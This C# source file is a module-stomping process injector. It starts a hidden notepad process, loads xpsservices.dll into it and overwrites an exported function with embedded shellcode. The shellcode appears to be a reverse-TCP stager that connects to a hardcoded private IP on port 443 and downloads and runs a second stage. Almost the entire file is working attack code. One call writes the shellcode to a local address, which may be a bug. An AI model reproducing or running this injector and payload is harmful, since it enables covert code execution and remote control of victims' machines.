using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

// original code - https://offensivedefence.co.uk/posts/module-stomping/

namespace ModuleStomping_Injector
{
    internal class Program
    {
        static string ModuleName = "xpsservices.dll";

        const uint INFINITE = 0xFFFFFFFF;
        const uint DONT_RESOLVE_DLL_REFERENCES = 0x00000001;
        
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            AllocationType flAllocationType,
            MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern bool VirtualFreeEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            AllocationType dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibraryA(
            string fileName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibraryExA(
            string lpFileName,
            IntPtr hReservedNull,
            uint dwFlags);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);
        static byte[] GenerateLLExShim(long loadLibraryExP)
        {
            MemoryStream ms = new MemoryStream();
            BinaryWriter bw = new BinaryWriter(ms);

            //Long winded way of getting bytes as little endian
            if (Is64Bit)
            {
                bw.Write((ulong)loadLibraryExP);
                var loadLibraryExBytes = ms.ToArray();

                return new byte[] {
                    0x48, 0xB8, loadLibraryExBytes[0], loadLibraryExBytes[1], loadLibraryExBytes[2], loadLibraryExBytes[3], loadLibraryExBytes[4], loadLibraryExBytes[5], loadLibraryExBytes[6],loadLibraryExBytes[7],
                    0x49, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,
                    0x48, 0x31, 0xD2,
                    0xFF, 0xE0
                };
            }
            else
            {
                bw.Write((uint)loadLibraryExP);
                var loadLibraryExBytes = ms.ToArray();

                return new byte[] {
                    0xB8, loadLibraryExBytes[0], loadLibraryExBytes[1], loadLibraryExBytes[2], loadLibraryExBytes[3],
                    0x6A, 0x01,
                    0x6A, 0x00,
                    0xFF, 0x74, 0x24, 0x0c,
                    0xFF, 0xD0,
                    0xC2, 0x0C, 0x00
                };
            }
        }

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }
        static void Main(string[] args)
        {
            // put your shellcode here
            byte[] shellcode = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x0f,
0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,
0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x44,0x8b,0x40,0x20,0x8b,0x48,0x18,0x50,0x49,0x01,0xd0,
0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,
0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,
0xc0,0xa8,0x85,0x85,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,
0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,
0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,
0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,
0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,
0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,
0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,
0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,
0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,
0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,
0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,
0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,
0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,
0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,
0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,
0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
};

            // Create target process
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "notepad",
                    WindowStyle = ProcessWindowStyle.Hidden
                }
            };

            try
            {
                process.Start();

                // Load DLL into remote process
                var loadLibraryExPtr = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryExA");
                var shim = GenerateLLExShim((long)loadLibraryExPtr);
                var encModuleName = Encoding.ASCII.GetBytes(ModuleName);
                var allocModule = VirtualAllocEx(process.Handle, IntPtr.Zero, (uint)encModuleName.Length + 2, AllocationType.Commit, MemoryProtection.ReadWrite);
                var allocShim = VirtualAllocEx(process.Handle, IntPtr.Zero, (uint)shim.Length, AllocationType.Commit, MemoryProtection.ExecuteRead);

                WriteProcessMemory(process.Handle, allocShim, shim, (uint)shim.Length, out UIntPtr _);
                WriteProcessMemory(process.Handle, allocModule, encModuleName, (uint)encModuleName.Length, out UIntPtr _);

                var hThread = CreateRemoteThread(process.Handle, IntPtr.Zero, 0, allocShim, allocModule, 0, IntPtr.Zero);

                // Wait for our loader thread to finish
                WaitForSingleObject(hThread, INFINITE);

                // Free memory
                VirtualFreeEx(process.Handle, allocModule, 0, AllocationType.Release);
                VirtualFreeEx(process.Handle, allocShim, 0, AllocationType.Release);

                // Get address of exported function
                var xps = LoadLibraryExA("xpsservices.dll", IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);
                var funcAddress = GetProcAddress(xps, "DllCanUnloadNow");
                var funcOffset = (long)funcAddress - (long)xps;
                var remoteFuncAddress = IntPtr.Zero;

                process = Process.GetProcessById(process.Id);

                // We need to work out the address of DllCanUnloadNow in the remote process.
                // Typically it will be the same as this process but not always.  So we calculate
                // the offset to the function in this process and add it to the base address
                // of the module in the remote process.

                foreach (ProcessModule module in process.Modules)
                {
                    if (module.ModuleName.Equals(ModuleName, StringComparison.OrdinalIgnoreCase))
                    {
                        remoteFuncAddress = new IntPtr((long)module.BaseAddress + funcOffset);
                        break;
                    }
                }

                if (remoteFuncAddress == IntPtr.Zero)
                {
                    Console.WriteLine("[!] Couldn't find module in remote process, incorrect path maybe?");
                    return;
                }

                // Write and execute shellcode
                WriteProcessMemory(process.Handle, funcAddress, shellcode, (uint)shellcode.Length, out UIntPtr _);
                CreateRemoteThread(process.Handle, IntPtr.Zero, 0, remoteFuncAddress, IntPtr.Zero, 0, IntPtr.Zero);
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }
            finally
            {
                Console.WriteLine("Press any key to kill notepad");
                Console.Read();

                if (!process.HasExited)
                {
                    process.Kill();

                }
            }

        }
    }
}
